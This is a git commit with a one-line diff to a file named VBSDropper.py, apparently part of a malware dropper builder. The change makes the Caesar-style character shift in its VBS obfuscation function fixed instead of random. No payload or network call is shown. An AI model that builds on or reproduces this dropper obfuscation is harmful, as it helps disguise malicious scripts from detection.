72bb2500aa12686feac88f46bc73cdd184f0ce1b
やまち 𝓚3𝓡𝓝𝓔𝓛 さくら <132711888+K3rnel-Dev@users.noreply.github.com>
2025-05-05 11:05:31 +0300

    ~ fix

--- VBSDropper.py
+++ VBSDropper.py
@@ -34,7 +34,7 @@ class VBSWrapperGenerator:
         self.history_index = 0
 
     def obfuscate_vbs_code(self, code):
-        shift_num = random.randint(4, 7)
+        shift_num = 4
         
         obfuscated = ''.join(chr(ord(v) + shift_num) for v in code)
         
